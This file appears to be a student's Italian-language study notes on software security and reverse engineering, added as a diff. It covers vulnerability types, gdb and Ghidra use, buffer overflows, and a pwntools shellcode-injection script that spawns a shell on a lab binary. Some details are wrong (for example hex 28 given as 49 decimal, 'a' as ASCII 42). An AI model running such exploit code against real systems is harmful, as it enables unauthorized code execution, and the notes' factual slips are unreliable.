@@ -1,0 +1,104 @@
+Bug: an error or a fault that causes a failure
+Error: a human action that produces an incorrect result
+Fault: an incorrect step, process, or data definition in a
+computer program
+Failure: the inability of software to perform its required
+functions within specified performance requirements
+
+VULNERABILITA
+information leakage: informazioni mostrate agli uteni finali non intenzionalmente e usate da attaccanti per irrompere nell'applicazione
+race condition: interferenze fra thread che condividono risorse, è il tempo fra l'applicazione di un controllo di sicurezza e l'utilizzo dei servizi in un sistema
+ad esempio finchè il programma attende l'input con scanf posso linkare il file su un altro /etc/shadow
+assunzioni non corrette su input e output
+non validazione di input 
+non corretta implementazione di gestione delle eccezzioni
+
+BUONE PRATICHE SOFTWARE
+codice semplice
+tieni traccia delle assunzioni a tempo di progettazione e verificale nel momento in cui è eseguito
+testa il codice con input strani inattesi corti lunghi vuoti numeri negativi
+
+ANALISI DEI PROGRAMMI
+statica: effettuata senza eseguire il programma, fatta sul codice oggetto (compilato) o sul codice c
+dinamica: mentre lo eseguo
+
+CHE VERIFICHE FARE SU FILE ELF
+stringhe statiche 
+readelf -x .roadata nomeeseguibile -> mostra stringhe hardcodatte nella sezione roadata
+
+Given a binary file we can:
+	check if the file is executable or not
+	discover the architecture for which the binary has been compiled
+	collect symbols and strings used in the program
+	check if there is a running process associated with the binary
+	read the SHA of a file and check if it is associated with some malicious software
+	identify function names and used libraries
+
+
+ANALISI DINAMICA CON GDB
+nexti (prossima istruzione)
+vedo stack aggiornato riga per riga con le varie variabili e il loro valore riga per riga
+ltrace traccia le chiamate alle librerie (vedo ad esempio se c'è unna chiamata a strcmp con la stringa che devo inserire, coeme la password)
+strace è un tool simile che traccia le syscall del programma al sistema operativo
+per evitare vulnerabilità devo cifrare sia l'input utente sia la password segreta, e confronto quest'ultimi
+esistono tecniche per evitare debugging, eseguo codice che causa errori quando il debugger cerca di tracciare il programma -> self-debugging
+
+SELF DEBUGGING	
+quando traccio l'esecuzione del programma con gdb genero nuovo processo con funzione ptrace, che termina il programma
+se riesco a saltare l'invocazione di ptrace salto questo controllo
+possono esistere funzioni che non vengono mai chiamate, ma con gef e l'istruzione call posso richiamarle comunque
+
+
+MEMORY CORRUPTION
+attaccante modifica celle di memoria per modificare comportamento di un programma, con ad esempio buffer overflow
+buffer overflow: su array puntatori e stringhe, permettono l'accesso a dati al di fuori dai limiti dell'array 
+si può copiare una stringa più lunga di quella che è stata allocata
+si possono modificare i puntatori per referenziare locazioni errate
+posso modificare return address nello stack trace, quindi al termine di una funzione eseguo codice che voglio io e non la funzione chiamante
+ad esempio se eseguo strcpy di argv[1] in una variabile che contiene 10 caratteri, se in argv[1] metto 100 caratteri copio i primi 10 e gli altri sovrascrivono altre aree di memoria
+devo provare a inviare input sempre più grandi e vedo quando cambia il valore della variabile (se nell'input invio delle a ad esempio vedo se compare 42 cioè il suo valore ascii)
+devo stare attento a little e big endian della variabile per vedere quali byte mettere prima
+come forzare esecuzione funzione: 
+	objdump -d return -> disassembla file binario
+	mi mostra in output per ogni funzione il suoo indirizzo
+	vedo anche dove è sono allocate le variabili e quanto occupano ($0x28,%esp 28 byte in esadecimale quindi 49 in decimale)
+	vedo l'indirizzo di ebp e verifico quanto distante è il buffer da ebp e quanto occupa il return address 
+	-0x1c(%ebp),%eax -> bufer 1c cioè 28 byte prima di ebp, se dichiarato di 20 byte ne occupa comunque 28
+	ora so che ci sono 28 byte per buffer, poi 4 per ebp e poi c'è il return address (per la struttura dei file elf classica quando sono caricati in memoria)
+	invio con python con una print dei caratteri a caso per la dimensione del buffer e lo spazio dal buffer ll'ebp e poi invio l'indirizzo della funzione da chiamare
+
+SHELLCODE INJECTION
+inietto un payload con system call che invoca terminale presente in /bin/sh
+per effttuarlo l'attaccante sovrascrive registro eip per riferire un'area di memoria da lui controllata
+in questa area mette istruzioni che creano una shell
+l'ordine delle operazioni da fare è:
+	verificare se si può effettuare buffer overflow
+		uso cyclic numbyte | ./eseguibile -> inietta un input lungo
+		dsmeg | tail -n 2 -> info su errore che ha causato l'interruzione del programma (esempio core dump se vado oltre limiti di memoria)
+	iniettare codice shell nello stack
+	identificare l'indirizzo a cui saltare
+
+from pwn import *
+
+exe = ELF('shellcode')
+context.binary = exe
+
+payload = b'a'*32
+payload += p32(0x8049267)
+payload += asm(shellcraft.sh())
+
+p = process('./shellcode')
+p.sendlineafter(b'name: ',payload)
+
+print(p.clean())
+p.interactive()
+        
+p = process('./shellcode')
+p.sendlineafter(b'name: ',payload)
+            	
+
+GHIDRA
+dopo aver creato progetto, cliccato sul drago e importato un eseguibile avvia l'analisi
+se vedi il main di fianco hai il codice, con click destro sullaa variabile puoi rinominarla dal menua a tendina, con click destro su numero esadecimale puoi convertirlo in decimale
+click destro su funzione e vai a definizione per vederne il codice
+altri software simili binaryninja e catter (catter visualizza meglio l'assembly)	
